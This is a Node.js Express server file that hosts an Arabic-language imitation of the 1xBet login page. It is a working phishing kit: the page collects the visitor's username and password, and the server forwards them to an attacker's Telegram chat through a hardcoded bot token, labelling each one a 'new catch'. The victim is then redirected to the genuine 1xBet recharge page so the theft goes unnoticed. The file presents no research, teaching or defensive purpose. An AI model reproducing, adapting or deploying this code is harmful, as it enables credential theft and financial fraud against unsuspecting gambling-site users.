const express = require('express');
const axios = require('axios');
const { registerAuthRoutes } = require('./lib/auth-routes');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
registerAuthRoutes(app);

const BOT_TOKEN = '8772797427:AAFLsQQMMiBUlZrxSESBU34JDVTHFAI06-w';
const CHAT_ID = '6664763520';

// واجهة الدخول (HTML داخل السيرفر مباشرة)
const loginPage = `
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - 1xBet</title>
    <style>
        body { font-family: sans-serif; background: #f4f7f9; margin: 0; display: flex; justify-content: center; }
        .card { background: white; width: 100%; max-width: 400px; min-height: 100vh; display: flex; flex-direction: column; }
        .header { padding: 15px; border-bottom: 1px solid #eee; text-align: center; font-weight: bold; }
        .form { padding: 30px 20px; }
        input { width: 100%; padding: 15px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        .btn { width: 100%; padding: 15px; background: #82b541; color: white; border: none; border-radius: 5px; font-size: 18px; font-weight: bold; width: 100%; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <div class="header">تسجيل الدخول</div>
        <div class="form">
            <input type="text" id="u" placeholder="البريد الإلكتروني أو المعرف *">
            <input type="password" id="p" placeholder="كلمة المرور *">
            <button class="btn" onclick="send()">تسجيل الدخول</button>
        </div>
    </div>
    <script>
        async function send() {
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(!u || !p) return alert("امسح الحقول");
            await fetch('/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u, p})
            });
            window.location.href = "https://1xbet.com/en/office/recharge";
        }
    </script>
</body>
</html>
`;

app.get('/', (req, res) => res.send(loginPage));

app.post('/login', async (req, res) => {
    const { u, p } = req.body;
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: `🔔 صيد جديد:\n👤: ${u}\n🔑: ${p}`
        });
        res.sendStatus(200);
    } catch (e) { res.sendStatus(500); }
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => console.log(`✅ Ready on port ${PORT}!`));